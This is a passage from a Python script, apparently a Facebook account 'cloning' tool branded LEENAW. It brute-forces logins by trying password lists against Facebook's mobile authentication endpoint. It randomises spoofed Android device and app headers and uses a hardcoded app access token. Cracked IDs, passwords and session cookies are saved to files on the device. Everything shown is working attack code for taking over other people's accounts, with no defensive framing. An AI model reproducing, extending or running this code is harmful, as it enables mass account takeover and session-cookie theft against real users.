                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mLEENAW-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/LEENAW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/LEENAW-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mLEENAW-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mLEENAW-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/LEENAW-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ METHOD RANDOM CLONING ]______>>  
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLEENAW-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['V2057A','I2208','V2228','V1922A','V1916A','V1930A','vivo Y55A','vivo Y55A','I2018','vivo 1707','V2168A','V2228','V1836A','V1930A','V2057A','vivo 1707','V2121A','V2121A','V2147','V1824A'])
                                ua = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}#'Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/LEENAW-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;95m[\033[0;97mLEENAW-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/LEENAW-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/LEENAW-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mLEENAW-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                open('/sdcard/LEENAW-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ NETWORK ERROR ]______>>  
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n\033[0;97m[⋆]\033[1;31m NO INTERNET CONNECTION...')
        exit()
except Exception as e:pass
menu()